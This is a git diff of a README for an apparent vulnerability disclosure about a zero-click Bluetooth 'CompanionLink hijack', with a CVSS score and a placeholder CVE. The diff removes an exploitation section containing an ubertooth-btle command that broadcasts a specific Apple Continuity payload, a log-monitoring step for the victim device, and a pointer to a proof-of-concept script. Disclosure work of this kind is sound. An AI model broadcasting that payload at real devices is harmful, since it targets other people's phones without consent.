@@ -1,4 +1,4 @@
-# HELLO WORLD
+# Hello World
 ## Zero-Click CompanionLink Hijack 
 **CVSS 9.3 | CVE-2025-XXXXX**
 ---
@@ -127,32 +127,14 @@ dd if=4.\ Evidence/SoC_RAM.bin bs=1 skip=$((0x0cdd30)) count=4 | xxd
 # Expected: 01 00 24 00 (FL=0x01, CF=0x24)
 ```
 
-### Exploitation
-```bash
-# 1. Broadcast Apple Continuity payload
-ubertooth-btle -t -A 37,38,39 -d 001ff3fb80df \
-  -p 4c000719010f2021568f0140e42dc8ca2adbffe681e4b14d5fd6840
-
-# 2. Monitor victim device
-log stream --predicate 'eventMessage CONTAINS "6D810001"' &
-
-# 3. Trigger state transition (DFU/network reset/reboot)
-
-# 4. Observe CID 0x6D810001 with FL 0x1 within 5 seconds
-```
-
-Full reproduction steps: `3. Reproduction/EXPLOIT_POC.sh`
-
----
 
 ## REPOSITORY CONTENTS
 
 ```
 1. BCM_V3_Report.md              Main vulnerability report
 2. BT Hardware Analysis.md       Runtime forensics (tracev3 evidence)
-3. Reproduction/
-   └── EXPLOIT_POC.sh            Proof-of-concept script
-4. Evidence/
+
+Evidence/
    ├── SoC_RAM.bin               BCM firmware dump (2.0M)
    └── firmware_evidence.md      Hex dumps and verification commands
 Remote Exploitation/
